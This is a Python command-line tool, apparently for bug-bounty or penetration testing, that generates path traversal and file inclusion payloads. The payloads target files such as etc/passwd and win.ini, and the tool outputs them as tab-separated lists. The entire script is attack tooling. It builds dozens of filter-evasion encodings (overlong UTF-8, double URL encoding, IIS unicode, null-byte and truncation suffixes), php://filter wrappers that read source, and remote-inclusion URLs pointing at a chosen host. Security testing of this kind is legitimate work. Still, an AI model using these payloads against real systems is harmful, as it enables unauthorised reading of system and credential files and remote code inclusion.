#!/usr/bin/env python3
"""Generate path traversal / LFI payloads (offline).

Usage:
  traversal_payloads.py --os linux|windows|any --file etc/passwd [--depth 8] [--prefix /var/www/images/]
                        [--suffix .png] [--families plain,url,...] [--wrappers] [--rfi-host HOST]
                        [--custom base64,base64url,hex]

--file is relative to the filesystem root, without a leading slash (etc/passwd, windows/win.ini).
Output TSV: family <TAB> payload. All payloads are ASCII (non-ASCII forms are percent-encoded).

Families: plain, backslash, mixed, url, url-dots, url-slash, double-url, triple-url, overlong-utf8,
iis-unicode, fullwidth, nonrecursive, nested, absolute, prefix, suffix, wrapper, rfi, custom.
"""
import argparse
import base64
import sys

SEP = {"/": "/", "\\": "\\"}


def seq(unit, d, f, sep):
    return unit * d + f.replace("/", sep) if sep == "\\" else unit * d + f


def build(osname, f, depth, prefix, suffix, wrappers, rfi_host, custom):
    f = f.lstrip("/\\")
    fwin = f.replace("/", "\\")
    out = []
    add = lambda fam, p: out.append((fam, p))
    depths = sorted({d for d in (1, 2, 3, 4, 6, depth) if 1 <= d <= depth})
    lin = osname in ("linux", "any")
    win = osname in ("windows", "any")

    for d in range(1, depth + 1):
        if lin:
            add("plain", "../" * d + f)
        if win:
            add("backslash", "..\\" * d + fwin)
    D = depth
    if win:
        add("mixed", "..\\/" * D + f)
        add("mixed", "../\\" * D + f)
    for d in depths:
        add("url", "%2e%2e%2f" * d + f)
        add("url-dots", "%2e%2e/" * d + f)
        add("url-slash", "..%2f" * d + f)
        add("double-url", "%252e%252e%252f" * d + f)
        add("double-url", "..%252f" * d + f)
        if win:
            add("url", "..%5c" * d + fwin)
            add("double-url", "..%255c" * d + fwin)
    add("triple-url", "%25252e%25252e%25252f" * D + f)
    add("overlong-utf8", "..%c0%af" * D + f)
    add("overlong-utf8", "%c0%ae%c0%ae%c0%af" * D + f)
    add("overlong-utf8", "..%e0%80%af" * D + f)
    add("overlong-utf8", "..%c1%9c" * D + fwin)
    add("overlong-utf8", "%c0%ae%c0%ae/" * D + f)
    add("iis-unicode", "%u002e%u002e%u2215" * D + f)
    add("iis-unicode", "%u002e%u002e%u2216" * D + fwin)
    add("fullwidth", "..%ef%bc%8f" * D + f)
    add("fullwidth", "%ef%bc%8e%ef%bc%8e%ef%bc%8f" * D + f)
    for unit in ("....//", "..././", "....\\/", "....\\\\", ".../...//", "..%2f/", "....%2f%2f"):
        add("nonrecursive", unit * D + (fwin if "\\" in unit and win and not lin else f))
    for unit in ("%2e./", ".%2e/", "..%252f", "%252e%252e%2f", "%%32%65%%32%65%%32%66", "%25%32%65%25%32%65%25%32%66",
                 "..%00/", "..%0d/", "..;/", "%2e%2e%3b/"):
        add("nested", unit * D + f)
    if lin:
        add("absolute", "/" + f)
        add("absolute", "//" + f)
        add("absolute", "file:///" + f)
        add("absolute", "file://localhost/" + f)
        add("absolute", "/./" + f)
    if win:
        for p in ("C:\\" + fwin, "C:/" + f, "\\" + fwin, "file:///C:/" + f, "\\\\localhost\\c$\\" + fwin,
                  "\\\\?\\C:\\" + fwin, "C:..\\" * 1 + "..\\" * D + fwin):
            add("absolute", p)
    if prefix:
        pre = prefix if prefix.endswith(("/", "\\")) else prefix + "/"
        add("prefix", pre + "../" * D + f)
        add("prefix", pre + "..%2f" * D + f)
        add("prefix", pre + "....//" * D + f)
        if win:
            add("prefix", pre + "..\\" * D + fwin)
    if suffix:
        base = "../" * D + f
        for s in ("%00" + suffix, "%2500" + suffix, "\\0" + suffix, "?" + suffix, "%3f" + suffix, "#" + suffix,
                  "%23" + suffix, ";" + suffix, "%20" + suffix, "/." + suffix):
            add("suffix", base + s)
        add("suffix", base + "/." * 2050)          # path truncation (legacy PHP, 4096 limit)
        if win:
            add("suffix", "..\\" * D + fwin + "." + suffix)
            add("suffix", "..\\" * D + fwin + "::$DATA")
    if wrappers:
        target = "/" + f if lin else "C:/" + f
        for w in ("php://filter/convert.base64-encode/resource=" + target,
                  "pHp://FilTer/convert.base64-encode/resource=" + target,
                  "php://filter/read=string.rot13/resource=" + target,
                  "php://filter/zlib.deflate/convert.base64-encode/resource=" + target,
                  "php://filter/convert.base64-encode/resource=index.php",
                  "file://" + target, "netdoc://" + target):
            add("wrapper", w)
    if rfi_host:
        h = rfi_host
        for r in (f"http://{h}/bbtest.txt", f"https://{h}/bbtest.txt", f"//{h}/bbtest.txt",
                  f"http:%2f%2f{h}%2fbbtest.txt", f"http:%252f%252f{h}%252fbbtest.txt", f"http://{h}/bbtest.txt%00",
                  f"http://{h}/bbtest.txt?", f"ftp://{h}/bbtest.txt", f"\\\\{h}\\share\\bbtest.txt"):
            add("rfi", r)
    if custom:
        plain = "../" * D + f
        for c in custom:
            if c == "base64":
                add("custom-base64", base64.b64encode(plain.encode()).decode())
            elif c == "base64url":
                add("custom-base64url", base64.urlsafe_b64encode(plain.encode()).decode().rstrip("="))
            elif c == "hex":
                add("custom-hex", plain.encode().hex())
            elif c == "rot13":
                import codecs
                add("custom-rot13", codecs.encode(plain, "rot13"))
    return out


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--os", default="linux", choices=["linux", "windows", "any"])
    ap.add_argument("--file")
    ap.add_argument("--depth", type=int, default=8)
    ap.add_argument("--prefix")
    ap.add_argument("--suffix")
    ap.add_argument("--families")
    ap.add_argument("--wrappers", action="store_true")
    ap.add_argument("--rfi-host")
    ap.add_argument("--custom")
    a = ap.parse_args()
    f = a.file or ("windows/win.ini" if a.os == "windows" else "etc/passwd")
    if not 1 <= a.depth <= 20:
        sys.exit("--depth must be 1..20")
    rows = build(a.os, f, a.depth, a.prefix, a.suffix, a.wrappers, a.rfi_host,
                 [c.strip() for c in a.custom.split(",")] if a.custom else [])
    fams = {x.strip() for x in a.families.split(",")} if a.families else None
    print("family\tpayload")
    seen = set()
    for fam, p in rows:
        if fams and fam not in fams and fam.split("-")[0] not in fams:
            continue
        if p in seen:
            continue
        seen.add(p)
        print(f"{fam}\t{p}")


if __name__ == "__main__":
    main()
